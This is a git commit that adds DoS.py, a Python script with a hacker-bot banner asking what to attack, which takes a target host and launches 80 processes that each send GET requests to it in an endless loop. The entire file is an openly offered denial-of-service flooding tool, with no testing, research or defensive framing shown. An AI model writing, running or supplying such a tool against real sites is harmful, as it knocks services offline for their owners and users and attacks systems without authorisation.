f31fd368162920af420f4492a057e17728a7684e
TORVOM <134101258+TORVOM@users.noreply.github.com>
2024-03-03 12:12:25 -0300

    Add files via upload

---
+++ DoS.py
@@ -0,0 +1,215 @@
+import os
+import requests
+from time import sleep
+import multiprocessing
+
+print()
+print()
+
+#=CORES>
+azcr = "\033[36m"
+vml = "\033[31m"
+sc = "\033[m"
+az = "\033[34m"
+rx = "\033[35m"
+n = 0
+
+def boot():
+    print(f"""
+           _______________________
+          /                      /
+         / I'm bot from TORVOM  /
+        /______________________/
+        {rx}__{sc}/
+       {rx}[{vml}¤¤{rx}]{sc}      ___________________{rx}
+       [{vml}¤¤{rx}]{sc}-----|    what i atack?  |{rx}
+       _[]_     {sc}|___________________|{rx}
+      //  \\\\
+{sc}""")
+
+os.system("clear")
+
+boot()
+print()
+site = str(input("HOST: "))
+inpt = str(input("nome do input html: "))
+#site = "coloque-o-host-para-ser-altomatico"
+os.system("clear")
+data ={
+    inpt: "=========================\nconectado|By: discorde\nhost|port|By: full stack\nhacker   |By: fox B.\n========================="
+}
+def DDoS():
+    while True:
+        rpt = requests.get(site)
+        scd = rpt.status_code
+        dado = rpt.text
+        if scd == 200:
+            print(f"""{azcr}
+{azcr}BY: {site}
+{az}{rpt}
+{sc}""")
+        elif scd == 404:
+            print("endereço de site não encontrado.")
+#>code>run
+code1 = multiprocessing.Process(target=DDoS)
+code2 = multiprocessing.Process(target=DDoS)
+code3 = multiprocessing.Process(target=DDoS)
+code4 = multiprocessing.Process(target=DDoS)
+code5 = multiprocessing.Process(target=DDoS)
+code6 = multiprocessing.Process(target=DDoS)
+code7 = multiprocessing.Process(target=DDoS)
+code8 = multiprocessing.Process(target=DDoS)
+code9 = multiprocessing.Process(target=DDoS)
+code10 = multiprocessing.Process(target=DDoS)
+code11 = multiprocessing.Process(target=DDoS)
+code12 = multiprocessing.Process(target=DDoS)
+code13 = multiprocessing.Process(target=DDoS)
+code14 = multiprocessing.Process(target=DDoS)
+code15 = multiprocessing.Process(target=DDoS)
+code16 = multiprocessing.Process(target=DDoS)
+code17 = multiprocessing.Process(target=DDoS)
+code18 = multiprocessing.Process(target=DDoS)
+code19 = multiprocessing.Process(target=DDoS)
+code20 = multiprocessing.Process(target=DDoS)
+code21 = multiprocessing.Process(target=DDoS)
+code22 = multiprocessing.Process(target=DDoS)
+code23 = multiprocessing.Process(target=DDoS)
+code24 = multiprocessing.Process(target=DDoS)
+code25 = multiprocessing.Process(target=DDoS)
+code26 = multiprocessing.Process(target=DDoS)
+code27 = multiprocessing.Process(target=DDoS)
+code28 = multiprocessing.Process(target=DDoS)
+code29 = multiprocessing.Process(target=DDoS)
+code30 = multiprocessing.Process(target=DDoS)
+code31 = multiprocessing.Process(target=DDoS)
+code32 = multiprocessing.Process(target=DDoS)
+code33 = multiprocessing.Process(target=DDoS)
+code34 = multiprocessing.Process(target=DDoS)
+code35 = multiprocessing.Process(target=DDoS)
+code36 = multiprocessing.Process(target=DDoS)
+code37 = multiprocessing.Process(target=DDoS)
+code38 = multiprocessing.Process(target=DDoS)
+code39 = multiprocessing.Process(target=DDoS)
+code40 = multiprocessing.Process(target=DDoS)
+code41 = multiprocessing.Process(target=DDoS)
+code42 = multiprocessing.Process(target=DDoS)
+code43 = multiprocessing.Process(target=DDoS)
+code44 = multiprocessing.Process(target=DDoS)
+code45 = multiprocessing.Process(target=DDoS)
+code46 = multiprocessing.Process(target=DDoS)
+code47 = multiprocessing.Process(target=DDoS)
+code48 = multiprocessing.Process(target=DDoS)
+code49 = multiprocessing.Process(target=DDoS)
+code50 = multiprocessing.Process(target=DDoS)
+code51 = multiprocessing.Process(target=DDoS)
+code52 = multiprocessing.Process(target=DDoS)
+code53 = multiprocessing.Process(target=DDoS)
+code54 = multiprocessing.Process(target=DDoS)
+code55 = multiprocessing.Process(target=DDoS)
+code56 = multiprocessing.Process(target=DDoS)
+code57 = multiprocessing.Process(target=DDoS)
+code58 = multiprocessing.Process(target=DDoS)
+code59 = multiprocessing.Process(target=DDoS)
+code60 = multiprocessing.Process(target=DDoS)
+code61 = multiprocessing.Process(target=DDoS)
+code62 = multiprocessing.Process(target=DDoS)
+code63 = multiprocessing.Process(target=DDoS)
+code64 = multiprocessing.Process(target=DDoS)
+code65 = multiprocessing.Process(target=DDoS)
+code66 = multiprocessing.Process(target=DDoS)
+code67 = multiprocessing.Process(target=DDoS)
+code68 = multiprocessing.Process(target=DDoS)
+code69 = multiprocessing.Process(target=DDoS)
+code70 = multiprocessing.Process(target=DDoS)
+code71 = multiprocessing.Process(target=DDoS)
+code72 = multiprocessing.Process(target=DDoS)
+code73 = multiprocessing.Process(target=DDoS)
+code74 = multiprocessing.Process(target=DDoS)
+code75 = multiprocessing.Process(target=DDoS)
+code76 = multiprocessing.Process(target=DDoS)
+code77 = multiprocessing.Process(target=DDoS)
+code78 = multiprocessing.Process(target=DDoS)
+code79 = multiprocessing.Process(target=DDoS)
+code80 = multiprocessing.Process(target=DDoS)
+#=>[divisao]
+code1.start()
+code2.start()
+code3.start()
+code4.start()
+code5.start()
+code6.start()
+code7.start()
+code8.start()
+code9.start()
+code10.start()
+code11.start()
+code12.start()
+code13.start()
+code14.start()
+code15.start()
+code16.start()
+code17.start()
+code18.start()
+code19.start()
+code20.start()
+code21.start()
+code22.start()
+code23.start()
+code24.start()
+code25.start()
+code26.start()
+code27.start()
+code28.start()
+code29.start()
+code30.start()
+code31.start()
+code32.start()
+code33.start()
+code34.start()
+code35.start()
+code36.start()
+code37.start()
+code38.start()
+code39.start()
+code40.start()
+code41.start()
+code42.start()
+code43.start()
+code44.start()
+code45.start()
+code46.start()
+code47.start()
+code48.start()
+code49.start()
+code50.start()
+code51.start()
+code52.start()
+code53.start()
+code54.start()
+code55.start()
+code56.start()
+code57.start()
+code58.start()
+code59.start()
+code60.start()
+code61.start()
+code62.start()
+code63.start()
+code64.start()
+code65.start()
+code66.start()
+code67.start()
+code68.start()
+code69.start()
+code70.start()
+code71.start()
+code72.start()
+code73.start()
+code74.start()
+code75.start()
+code76.start()
+code77.start()
+code78.start()
+code79.start()
+code80.start()
+#>code>fim
